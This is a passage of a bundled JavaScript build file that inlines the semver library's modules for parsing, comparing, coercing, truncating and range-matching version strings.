            this.prerelease = [];
            break;
          case "patch":
            if (this.prerelease.length === 0) {
              this.patch++;
            }
            this.prerelease = [];
            break;
          // This probably shouldn't be used publicly.
          // 1.0.0 'pre' would become 1.0.0-0 which is the wrong direction.
          case "pre": {
            const base = Number(identifierBase) ? 1 : 0;
            if (this.prerelease.length === 0) {
              this.prerelease = [base];
            } else {
              let i = this.prerelease.length;
              while (--i >= 0) {
                if (typeof this.prerelease[i] === "number") {
                  this.prerelease[i]++;
                  i = -2;
                }
              }
              if (i === -1) {
                if (identifier === this.prerelease.join(".") && identifierBase === false) {
                  throw new Error("invalid increment argument: identifier already exists");
                }
                this.prerelease.push(base);
              }
            }
            if (identifier) {
              let prerelease = [identifier, base];
              if (identifierBase === false) {
                prerelease = [identifier];
              }
              if (isPrereleaseIdentifier(this.prerelease, identifier)) {
                const prereleaseBase = this.prerelease[identifier.split(".").length];
                if (isNaN(prereleaseBase)) {
                  this.prerelease = prerelease;
                }
              } else {
                this.prerelease = prerelease;
              }
            }
            break;
          }
          default:
            throw new Error(`invalid increment argument: ${release}`);
        }
        this.raw = this.format();
        if (this.build.length) {
          this.raw += `+${this.build.join(".")}`;
        }
        return this;
      }
    };
    module2.exports = SemVer;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/parse.js
var require_parse = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/parse.js"(exports2, module2) {
    "use strict";
    var SemVer = require_semver();
    var parse = (version, options, throwErrors = false) => {
      if (version instanceof SemVer) {
        return version;
      }
      try {
        return new SemVer(version, options);
      } catch (er) {
        if (!throwErrors) {
          return null;
        }
        throw er;
      }
    };
    module2.exports = parse;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/valid.js
var require_valid = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/valid.js"(exports2, module2) {
    "use strict";
    var parse = require_parse();
    var valid3 = (version, options) => {
      const v = parse(version, options);
      return v ? v.version : null;
    };
    module2.exports = valid3;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/clean.js
var require_clean = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/clean.js"(exports2, module2) {
    "use strict";
    var parse = require_parse();
    var clean = (version, options) => {
      const s = parse(version.trim().replace(/^[=v]+/, ""), options);
      return s ? s.version : null;
    };
    module2.exports = clean;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/inc.js
var require_inc = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/inc.js"(exports2, module2) {
    "use strict";
    var SemVer = require_semver();
    var inc = (version, release, options, identifier, identifierBase) => {
      if (typeof options === "string") {
        identifierBase = identifier;
        identifier = options;
        options = void 0;
      }
      try {
        return new SemVer(
          version instanceof SemVer ? version.version : version,
          options
        ).inc(release, identifier, identifierBase).version;
      } catch (er) {
        return null;
      }
    };
    module2.exports = inc;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/diff.js
var require_diff = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/diff.js"(exports2, module2) {
    "use strict";
    var parse = require_parse();
    var diff = (version1, version2) => {
      const v1 = parse(version1, null, true);
      const v2 = parse(version2, null, true);
      const comparison = v1.compare(v2);
      if (comparison === 0) {
        return null;
      }
      const v1Higher = comparison > 0;
      const highVersion = v1Higher ? v1 : v2;
      const lowVersion = v1Higher ? v2 : v1;
      const highHasPre = !!highVersion.prerelease.length;
      const lowHasPre = !!lowVersion.prerelease.length;
      if (lowHasPre && !highHasPre) {
        if (!lowVersion.patch && !lowVersion.minor) {
          return "major";
        }
        if (lowVersion.compareMain(highVersion) === 0) {
          if (lowVersion.minor && !lowVersion.patch) {
            return "minor";
          }
          return "patch";
        }
      }
      const prefix = highHasPre ? "pre" : "";
      if (v1.major !== v2.major) {
        return prefix + "major";
      }
      if (v1.minor !== v2.minor) {
        return prefix + "minor";
      }
      if (v1.patch !== v2.patch) {
        return prefix + "patch";
      }
      return "prerelease";
    };
    module2.exports = diff;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/major.js
var require_major = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/major.js"(exports2, module2) {
    "use strict";
    var SemVer = require_semver();
    var major = (a, loose) => new SemVer(a, loose).major;
    module2.exports = major;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/minor.js
var require_minor = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/minor.js"(exports2, module2) {
    "use strict";
    var SemVer = require_semver();
    var minor = (a, loose) => new SemVer(a, loose).minor;
    module2.exports = minor;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/patch.js
var require_patch = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/patch.js"(exports2, module2) {
    "use strict";
    var SemVer = require_semver();
    var patch = (a, loose) => new SemVer(a, loose).patch;
    module2.exports = patch;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/prerelease.js
var require_prerelease = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/prerelease.js"(exports2, module2) {
    "use strict";
    var parse = require_parse();
    var prerelease = (version, options) => {
      const parsed = parse(version, options);
      return parsed && parsed.prerelease.length ? parsed.prerelease : null;
    };
    module2.exports = prerelease;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/compare.js
var require_compare = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/compare.js"(exports2, module2) {
    "use strict";
    var SemVer = require_semver();
    var compare2 = (a, b, loose) => new SemVer(a, loose).compare(new SemVer(b, loose));
    module2.exports = compare2;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/rcompare.js
var require_rcompare = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/rcompare.js"(exports2, module2) {
    "use strict";
    var compare2 = require_compare();
    var rcompare = (a, b, loose) => compare2(b, a, loose);
    module2.exports = rcompare;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/compare-loose.js
var require_compare_loose = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/compare-loose.js"(exports2, module2) {
    "use strict";
    var compare2 = require_compare();
    var compareLoose = (a, b) => compare2(a, b, true);
    module2.exports = compareLoose;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/compare-build.js
var require_compare_build = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/compare-build.js"(exports2, module2) {
    "use strict";
    var SemVer = require_semver();
    var compareBuild = (a, b, loose) => {
      const versionA = new SemVer(a, loose);
      const versionB = new SemVer(b, loose);
      return versionA.compare(versionB) || versionA.compareBuild(versionB);
    };
    module2.exports = compareBuild;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/sort.js
var require_sort = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/sort.js"(exports2, module2) {
    "use strict";
    var compareBuild = require_compare_build();
    var sort = (list, loose) => list.sort((a, b) => compareBuild(a, b, loose));
    module2.exports = sort;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/rsort.js
var require_rsort = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/rsort.js"(exports2, module2) {
    "use strict";
    var compareBuild = require_compare_build();
    var rsort = (list, loose) => list.sort((a, b) => compareBuild(b, a, loose));
    module2.exports = rsort;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/gt.js
var require_gt = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/gt.js"(exports2, module2) {
    "use strict";
    var compare2 = require_compare();
    var gt = (a, b, loose) => compare2(a, b, loose) > 0;
    module2.exports = gt;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/lt.js
var require_lt = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/lt.js"(exports2, module2) {
    "use strict";
    var compare2 = require_compare();
    var lt = (a, b, loose) => compare2(a, b, loose) < 0;
    module2.exports = lt;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/eq.js
var require_eq = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/eq.js"(exports2, module2) {
    "use strict";
    var compare2 = require_compare();
    var eq = (a, b, loose) => compare2(a, b, loose) === 0;
    module2.exports = eq;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/neq.js
var require_neq = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/neq.js"(exports2, module2) {
    "use strict";
    var compare2 = require_compare();
    var neq = (a, b, loose) => compare2(a, b, loose) !== 0;
    module2.exports = neq;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/gte.js
var require_gte = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/gte.js"(exports2, module2) {
    "use strict";
    var compare2 = require_compare();
    var gte = (a, b, loose) => compare2(a, b, loose) >= 0;
    module2.exports = gte;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/lte.js
var require_lte = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/lte.js"(exports2, module2) {
    "use strict";
    var compare2 = require_compare();
    var lte = (a, b, loose) => compare2(a, b, loose) <= 0;
    module2.exports = lte;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/cmp.js
var require_cmp = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/cmp.js"(exports2, module2) {
    "use strict";
    var eq = require_eq();
    var neq = require_neq();
    var gt = require_gt();
    var gte = require_gte();
    var lt = require_lt();
    var lte = require_lte();
    var cmp = (a, op, b, loose) => {
      switch (op) {
        case "===":
          if (typeof a === "object") {
            a = a.version;
          }
          if (typeof b === "object") {
            b = b.version;
          }
          return a === b;
        case "!==":
          if (typeof a === "object") {
            a = a.version;
          }
          if (typeof b === "object") {
            b = b.version;
          }
          return a !== b;
        case "":
        case "=":
        case "==":
          return eq(a, b, loose);
        case "!=":
          return neq(a, b, loose);
        case ">":
          return gt(a, b, loose);
        case ">=":
          return gte(a, b, loose);
        case "<":
          return lt(a, b, loose);
        case "<=":
          return lte(a, b, loose);
        default:
          throw new TypeError(`Invalid operator: ${op}`);
      }
    };
    module2.exports = cmp;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/coerce.js
var require_coerce = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/coerce.js"(exports2, module2) {
    "use strict";
    var SemVer = require_semver();
    var parse = require_parse();
    var { safeRe: re, t } = require_re();
    var coerce = (version, options) => {
      if (version instanceof SemVer) {
        return version;
      }
      if (typeof version === "number") {
        version = String(version);
      }
      if (typeof version !== "string") {
        return null;
      }
      options = options || {};
      let match = null;
      if (!options.rtl) {
        match = version.match(options.includePrerelease ? re[t.COERCEFULL] : re[t.COERCE]);
      } else {
        const coerceRtlRegex = options.includePrerelease ? re[t.COERCERTLFULL] : re[t.COERCERTL];
        let next;
        while ((next = coerceRtlRegex.exec(version)) && (!match || match.index + match[0].length !== version.length)) {
          if (!match || next.index + next[0].length !== match.index + match[0].length) {
            match = next;
          }
          coerceRtlRegex.lastIndex = next.index + next[1].length + next[2].length;
        }
        coerceRtlRegex.lastIndex = -1;
      }
      if (match === null) {
        return null;
      }
      const major = match[2];
      const minor = match[3] || "0";
      const patch = match[4] || "0";
      const prerelease = options.includePrerelease && match[5] ? `-${match[5]}` : "";
      const build = options.includePrerelease && match[6] ? `+${match[6]}` : "";
      return parse(`${major}.${minor}.${patch}${prerelease}${build}`, options);
    };
    module2.exports = coerce;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/truncate.js
var require_truncate = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/truncate.js"(exports2, module2) {
    "use strict";
    var parse = require_parse();
    var constants = require_constants();
    var SemVer = require_semver();
    var truncate = (version, truncation, options) => {
      if (!constants.RELEASE_TYPES.includes(truncation)) {
        return null;
      }
      const clonedVersion = cloneInputVersion(version, options);
      return clonedVersion && doTruncation(clonedVersion, truncation);
    };
    var cloneInputVersion = (version, options) => {
      const versionStringToParse = version instanceof SemVer ? version.version : version;
      return parse(versionStringToParse, options);
    };
    var doTruncation = (version, truncation) => {
      if (isPrerelease(truncation)) {
        return version.version;
      }
      version.prerelease = [];
      switch (truncation) {
        case "major":
          version.minor = 0;
          version.patch = 0;
          break;
        case "minor":
          version.patch = 0;
          break;
      }
      return version.format();
    };
    var isPrerelease = (type) => {
      return type.startsWith("pre");
    };
    module2.exports = truncate;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/internal/lrucache.js
var require_lrucache = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/internal/lrucache.js"(exports2, module2) {
    "use strict";
    var LRUCache = class {
      constructor() {
        this.max = 1e3;
        this.map = /* @__PURE__ */ new Map();
      }
      get(key) {
        const value = this.map.get(key);
        if (value === void 0) {
          return void 0;
        } else {
          this.map.delete(key);
          this.map.set(key, value);
          return value;
        }
      }
      delete(key) {
        return this.map.delete(key);
      }
      set(key, value) {
        const deleted = this.delete(key);
        if (!deleted && value !== void 0) {
          if (this.map.size >= this.max) {
            const firstKey = this.map.keys().next().value;
            this.delete(firstKey);
          }
          this.map.set(key, value);
        }
        return this;
      }
    };
    module2.exports = LRUCache;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/classes/range.js
var require_range = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/classes/range.js"(exports2, module2) {
    "use strict";
    var SPACE_CHARACTERS = /\s+/g;
    var Range = class _Range {
      constructor(range, options) {
        options = parseOptions(options);
        if (range instanceof _Range) {
          if (range.loose === !!options.loose && range.includePrerelease === !!options.includePrerelease) {
            return range;
          } else {
            return new _Range(range.raw, options);
          }
        }
        if (range instanceof Comparator) {
          this.raw = range.value;
          this.set = [[range]];
          this.formatted = void 0;
          return this;
        }
        this.options = options;
        this.loose = !!options.loose;
        this.includePrerelease = !!options.includePrerelease;
        this.raw = range.trim().replace(SPACE_CHARACTERS, " ");
        this.set = this.raw.split("||").map((r) => this.parseRange(r.trim())).filter((c) => c.length);
        if (!this.set.length) {
          throw new TypeError(`Invalid SemVer Range: ${this.raw}`);
        }
        if (this.set.length > 1) {
          const first = this.set[0];
          this.set = this.set.filter((c) => !isNullSet(c[0]));
          if (this.set.length === 0) {
            this.set = [first];
          } else if (this.set.length > 1) {
            for (const c of this.set) {
              if (c.length === 1 && isAny(c[0])) {
                this.set = [c];
                break;
              }
            }
          }
        }
        this.formatted = void 0;
      }
      get range() {
        if (this.formatted === void 0) {
          this.formatted = "";
          for (let i = 0; i < this.set.length; i++) {
            if (i > 0) {
              this.formatted += "||";
            }
            const comps = this.set[i];
            for (let k = 0; k < comps.length; k++) {
              if (k > 0) {
                this.formatted += " ";
              }
              this.formatted += comps[k].toString().trim();
            }
          }
        }
        return this.formatted;
      }
      format() {
        return this.range;
      }
      toString() {
        return this.range;
      }
      parseRange(range) {
        range = range.replace(BUILDSTRIPRE, "");
        const memoOpts = (this.options.includePrerelease && FLAG_INCLUDE_PRERELEASE) | (this.options.loose && FLAG_LOOSE);
        const memoKey = memoOpts + ":" + range;
        const cached = cache.get(memoKey);
        if (cached) {
          return cached;
        }
        const loose = this.options.loose;
        const hr = loose ? re[t.HYPHENRANGELOOSE] : re[t.HYPHENRANGE];
        range = range.replace(hr, hyphenReplace(this.options.includePrerelease));
        debug("hyphen replace", range);
        range = range.replace(re[t.COMPARATORTRIM], comparatorTrimReplace);
        debug("comparator trim", range);
        range = range.replace(re[t.TILDETRIM], tildeTrimReplace);
        debug("tilde trim", range);
        range = range.replace(re[t.CARETTRIM], caretTrimReplace);
        debug("caret trim", range);
        let rangeList = range.split(" ").map((comp) => parseComparator(comp, this.options)).join(" ").split(/\s+/).map((comp) => replaceGTE0(comp, this.options));
        if (loose) {
          rangeList = rangeList.filter((comp) => {
            debug("loose invalid filter", comp, this.options);
            return !!comp.match(re[t.COMPARATORLOOSE]);
          });
        }
        debug("range list", rangeList);
        const rangeMap = /* @__PURE__ */ new Map();
        const comparators = rangeList.map((comp) => new Comparator(comp, this.options));
        for (const comp of comparators) {
          if (isNullSet(comp)) {
            return [comp];
          }
          rangeMap.set(comp.value, comp);
        }
        if (rangeMap.size > 1 && rangeMap.has("")) {
          rangeMap.delete("");
        }
        const result = [...rangeMap.values()];
        cache.set(memoKey, result);
        return result;
      }
      intersects(range, options) {
        if (!(range instanceof _Range)) {
          throw new TypeError("a Range is required");
        }
        return this.set.some((thisComparators) => {
          return isSatisfiable(thisComparators, options) && range.set.some((rangeComparators) => {
            return isSatisfiable(rangeComparators, options) && thisComparators.every((thisComparator) => {
              return rangeComparators.every((rangeComparator) => {
                return thisComparator.intersects(rangeComparator, options);
              });
            });
          });
        });
      }
      // if ANY of the sets match ALL of its comparators, then pass
      test(version) {
        if (!version) {
          return false;
        }
        if (typeof version === "string") {
          try {
            version = new SemVer(version, this.options);
          } catch (er) {
            return false;
          }
        }
        for (let i = 0; i < this.set.length; i++) {
          if (testSet(this.set[i], version, this.options)) {
            return true;
          }
        }
        return false;
      }
    };
    module2.exports = Range;
    var LRU = require_lrucache();
    var cache = new LRU();
    var parseOptions = require_parse_options();
    var Comparator = require_comparator();
    var debug = require_debug();
    var SemVer = require_semver();
    var {
      safeRe: re,
      src,
      t,
      comparatorTrimReplace,
      tildeTrimReplace,
      caretTrimReplace
    } = require_re();
    var { FLAG_INCLUDE_PRERELEASE, FLAG_LOOSE } = require_constants();
    var BUILDSTRIPRE = new RegExp(src[t.BUILD], "g");
    var isNullSet = (c) => c.value === "<0.0.0-0";
    var isAny = (c) => c.value === "";
    var isSatisfiable = (comparators, options) => {
      let result = true;
      const remainingComparators = comparators.slice();
      let testComparator = remainingComparators.pop();
      while (result && remainingComparators.length) {
        result = remainingComparators.every((otherComparator) => {
          return testComparator.intersects(otherComparator, options);
        });
        testComparator = remainingComparators.pop();
      }
      return result;
    };
    var parseComparator = (comp, options) => {
      comp = comp.replace(re[t.BUILD], "");
      debug("comp", comp, options);
      comp = replaceCarets(comp, options);
      debug("caret", comp);
      comp = replaceTildes(comp, options);
      debug("tildes", comp);
      comp = replaceXRanges(comp, options);
      debug("xrange", comp);
      comp = replaceStars(comp, options);
      debug("stars", comp);
      return comp;
    };
    var isX = (id) => !id || id.toLowerCase() === "x" || id === "*";
    var invalidXRangeOrder = (M, m, p) => isX(M) && !isX(m) || isX(m) && p && !isX(p);
    var replaceTildes = (comp, options) => {
      return comp.trim().split(/\s+/).map((c) => replaceTilde(c, options)).join(" ");
    };
    var replaceTilde = (comp, options) => {
      const r = options.loose ? re[t.TILDELOOSE] : re[t.TILDE];
      const z = options.includePrerelease ? "-0" : "";
      return comp.replace(r, (_, M, m, p, pr) => {
        debug("tilde", comp, _, M, m, p, pr);
        let ret;
        if (isX(M)) {
          ret = "";
        } else if (isX(m)) {
          ret = `>=${M}.0.0${z} <${+M + 1}.0.0-0`;
        } else if (isX(p)) {
          ret = `>=${M}.${m}.0${z} <${M}.${+m + 1}.0-0`;
        } else if (pr) {
          debug("replaceTilde pr", pr);
          ret = `>=${M}.${m}.${p}-${pr} <${M}.${+m + 1}.0-0`;
        } else {
          ret = `>=${M}.${m}.${p} <${M}.${+m + 1}.0-0`;
        }
        debug("tilde return", ret);
        return ret;
      });
    };
    var replaceCarets = (comp, options) => {
      return comp.trim().split(/\s+/).map((c) => replaceCaret(c, options)).join(" ");
    };
    var replaceCaret = (comp, options) => {
      debug("caret", comp, options);
      const r = options.loose ? re[t.CARETLOOSE] : re[t.CARET];
      const z = options.includePrerelease ? "-0" : "";
      return comp.replace(r, (_, M, m, p, pr) => {
        debug("caret", comp, _, M, m, p, pr);
        let ret;
        if (isX(M)) {
          ret = "";
        } else if (isX(m)) {
          ret = `>=${M}.0.0${z} <${+M + 1}.0.0-0`;
        } else if (isX(p)) {
          if (M === "0") {
            ret = `>=${M}.${m}.0${z} <${M}.${+m + 1}.0-0`;
          } else {
            ret = `>=${M}.${m}.0${z} <${+M + 1}.0.0-0`;
          }
        } else if (pr) {
          debug("replaceCaret pr", pr);
          if (M === "0") {
            if (m === "0") {
              ret = `>=${M}.${m}.${p}-${pr} <${M}.${m}.${+p + 1}-0`;
            } else {
              ret = `>=${M}.${m}.${p}-${pr} <${M}.${+m + 1}.0-0`;
            }
          } else {
            ret = `>=${M}.${m}.${p}-${pr} <${+M + 1}.0.0-0`;
          }
        } else {
          debug("no pr");
          if (M === "0") {
            if (m === "0") {
              ret = `>=${M}.${m}.${p} <${M}.${m}.${+p + 1}-0`;
            } else {
              ret = `>=${M}.${m}.${p} <${M}.${+m + 1}.0-0`;
            }
          } else {
            ret = `>=${M}.${m}.${p} <${+M + 1}.0.0-0`;
          }
        }
        debug("caret return", ret);
        return ret;
      });
    };
    var replaceXRanges = (comp, options) => {
      debug("replaceXRanges", comp, options);
      return comp.split(/\s+/).map((c) => replaceXRange(c, options)).join(" ");
    };
    var replaceXRange = (comp, options) => {
      comp = comp.trim();
      const r = options.loose ? re[t.XRANGELOOSE] : re[t.XRANGE];
      return comp.replace(r, (ret, gtlt, M, m, p, pr) => {
        debug("xRange", comp, ret, gtlt, M, m, p, pr);
        if (invalidXRangeOrder(M, m, p)) {
          return comp;
        }
        const xM = isX(M);
        const xm = xM || isX(m);
        const xp = xm || isX(p);
        const anyX = xp;
        if (gtlt === "=" && anyX) {
          gtlt = "";
        }
        pr = options.includePrerelease ? "-0" : "";
        if (xM) {
          if (gtlt === ">" || gtlt === "<") {
            ret = "<0.0.0-0";
          } else {
            ret = "*";
          }
        } else if (gtlt && anyX) {
          if (xm) {
            m = 0;
          }
          p = 0;
          if (gtlt === ">") {
            gtlt = ">=";
            if (xm) {
              M = +M + 1;
              m = 0;
              p = 0;
            } else {
              m = +m + 1;
              p = 0;
            }
          } else if (gtlt === "<=") {
            gtlt = "<";
            if (xm) {
              M = +M + 1;
            } else {
              m = +m + 1;
            }
          }
          if (gtlt === "<") {
            pr = "-0";
          }
          ret = `${gtlt + M}.${m}.${p}${pr}`;
        } else if (xm) {
          ret = `>=${M}.0.0${pr} <${+M + 1}.0.0-0`;
        } else if (xp) {
          ret = `>=${M}.${m}.0${pr} <${M}.${+m + 1}.0-0`;
        }
        debug("xRange return", ret);
        return ret;
      });
    };
    var replaceStars = (comp, options) => {
      debug("replaceStars", comp, options);
      return comp.trim().replace(re[t.STAR], "");
    };
    var replaceGTE0 = (comp, options) => {
      debug("replaceGTE0", comp, options);
      return comp.trim().replace(re[options.includePrerelease ? t.GTE0PRE : t.GTE0], "");
    };
    var hyphenReplace = (incPr) => ($0, from, fM, fm, fp, fpr, fb, to, tM, tm, tp, tpr) => {
      if (isX(fM)) {
        from = "";
      } else if (isX(fm)) {
        from = `>=${fM}.0.0${incPr ? "-0" : ""}`;
      } else if (isX(fp)) {
        from = `>=${fM}.${fm}.0${incPr ? "-0" : ""}`;
      } else if (fpr) {
        from = `>=${from}`;
      } else {
        from = `>=${from}${incPr ? "-0" : ""}`;
      }
      if (isX(tM)) {
        to = "";
      } else if (isX(tm)) {
        to = `<${+tM + 1}.0.0-0`;
      } else if (isX(tp)) {
        to = `<${tM}.${+tm + 1}.0-0`;
      } else if (tpr) {
        to = `<=${tM}.${tm}.${tp}-${tpr}`;
      } else if (incPr) {
        to = `<${tM}.${tm}.${+tp + 1}-0`;
      } else {
        to = `<=${to}`;
      }
      return `${from} ${to}`.trim();
    };
    var testSet = (set, version, options) => {
      for (let i = 0; i < set.length; i++) {
        if (!set[i].test(version)) {
          return false;
        }
      }
      if (version.prerelease.length && !options.includePrerelease) {
        for (let i = 0; i < set.length; i++) {
          debug(set[i].semver);
          if (set[i].semver === Comparator.ANY) {
            continue;
          }
          if (set[i].semver.prerelease.length > 0) {
            const allowed = set[i].semver;
            if (allowed.major === version.major && allowed.minor === version.minor && allowed.patch === version.patch) {
              return true;
            }
          }
        }
        return false;
      }
      return true;
    };
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/classes/comparator.js
var require_comparator = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/classes/comparator.js"(exports2, module2) {
    "use strict";
    var ANY = /* @__PURE__ */ Symbol("SemVer ANY");
    var Comparator = class _Comparator {
      static get ANY() {
        return ANY;
      }
      constructor(comp, options) {
        options = parseOptions(options);
        if (comp instanceof _Comparator) {
          if (comp.loose === !!options.loose) {
            return comp;
          } else {
            comp = comp.value;
          }
        }
        comp = comp.trim().split(/\s+/).join(" ");
        debug("comparator", comp, options);
        this.options = options;
        this.loose = !!options.loose;
        this.parse(comp);
        if (this.semver === ANY) {
          this.value = "";
        } else {
          this.value = this.operator + this.semver.version;
        }
        debug("comp", this);
      }
      parse(comp) {
        const r = this.options.loose ? re[t.COMPARATORLOOSE] : re[t.COMPARATOR];
        const m = comp.match(r);
        if (!m) {
          throw new TypeError(`Invalid comparator: ${comp}`);
        }
        this.operator = m[1] !== void 0 ? m[1] : "";
        if (this.operator === "=") {
          this.operator = "";
        }
        if (!m[2]) {
          this.semver = ANY;
        } else {
          this.semver = new SemVer(m[2], this.options.loose);
        }
      }
      toString() {
        return this.value;
      }
      test(version) {
        debug("Comparator.test", version, this.options.loose);
        if (this.semver === ANY || version === ANY) {
          return true;
        }
        if (typeof version === "string") {
          try {
            version = new SemVer(version, this.options);
          } catch (er) {
            return false;
          }
        }
        return cmp(version, this.operator, this.semver, this.options);
      }
      intersects(comp, options) {
        if (!(comp instanceof _Comparator)) {
          throw new TypeError("a Comparator is required");
        }
        if (this.operator === "") {
          if (this.value === "") {
            return true;
          }
          return new Range(comp.value, options).test(this.value);
        } else if (comp.operator === "") {
          if (comp.value === "") {
            return true;
          }
          return new Range(this.value, options).test(comp.semver);
        }
        options = parseOptions(options);
        if (options.includePrerelease && (this.value === "<0.0.0-0" || comp.value === "<0.0.0-0")) {
          return false;
        }
        if (!options.includePrerelease && (this.value.startsWith("<0.0.0") || comp.value.startsWith("<0.0.0"))) {
          return false;
        }
        if (this.operator.startsWith(">") && comp.operator.startsWith(">")) {
          return true;
        }
        if (this.operator.startsWith("<") && comp.operator.startsWith("<")) {
          return true;
        }
        if (this.semver.version === comp.semver.version && this.operator.includes("=") && comp.operator.includes("=")) {
          return true;
        }
        if (cmp(this.semver, "<", comp.semver, options) && this.operator.startsWith(">") && comp.operator.startsWith("<")) {
          return true;
        }
        if (cmp(this.semver, ">", comp.semver, options) && this.operator.startsWith("<") && comp.operator.startsWith(">")) {
          return true;
        }
        return false;
      }
    };
    module2.exports = Comparator;
    var parseOptions = require_parse_options();
    var { safeRe: re, t } = require_re();
    var cmp = require_cmp();
    var debug = require_debug();
    var SemVer = require_semver();
    var Range = require_range();
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/satisfies.js
var require_satisfies = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/functions/satisfies.js"(exports2, module2) {
    "use strict";
    var Range = require_range();
    var satisfies = (version, range, options) => {
      try {
        range = new Range(range, options);
      } catch (er) {
        return false;
      }
      return range.test(version);
    };
    module2.exports = satisfies;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/to-comparators.js
var require_to_comparators = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/to-comparators.js"(exports2, module2) {
    "use strict";
    var Range = require_range();
    var toComparators = (range, options) => new Range(range, options).set.map((comp) => comp.map((c) => c.value).join(" ").trim().split(" "));
    module2.exports = toComparators;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/max-satisfying.js
var require_max_satisfying = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/max-satisfying.js"(exports2, module2) {
    "use strict";
    var SemVer = require_semver();
    var Range = require_range();
    var maxSatisfying2 = (versions, range, options) => {
      let max = null;
      let maxSV = null;
      let rangeObj = null;
      try {
        rangeObj = new Range(range, options);
      } catch (er) {
        return null;
      }
      versions.forEach((v) => {
        if (rangeObj.test(v)) {
          if (!max || maxSV.compare(v) === -1) {
            max = v;
            maxSV = new SemVer(max, options);
          }
        }
      });
      return max;
    };
    module2.exports = maxSatisfying2;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/min-satisfying.js
var require_min_satisfying = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/min-satisfying.js"(exports2, module2) {
    "use strict";
    var SemVer = require_semver();
    var Range = require_range();
    var minSatisfying = (versions, range, options) => {
      let min = null;
      let minSV = null;
      let rangeObj = null;
      try {
        rangeObj = new Range(range, options);
      } catch (er) {
        return null;
      }
      versions.forEach((v) => {
        if (rangeObj.test(v)) {
          if (!min || minSV.compare(v) === 1) {
            min = v;
            minSV = new SemVer(min, options);
          }
        }
      });
      return min;
    };
    module2.exports = minSatisfying;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/min-version.js
var require_min_version = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/ranges/min-version.js"(exports2, module2) {
    "use strict";
    var SemVer = require_semver();
    var Range = require_range();
    var gt = require_gt();
    var minVersion = (range, loose) => {
      range = new Range(range, loose);
      let minver = new SemVer("0.0.0");
      if (range.test(minver)) {
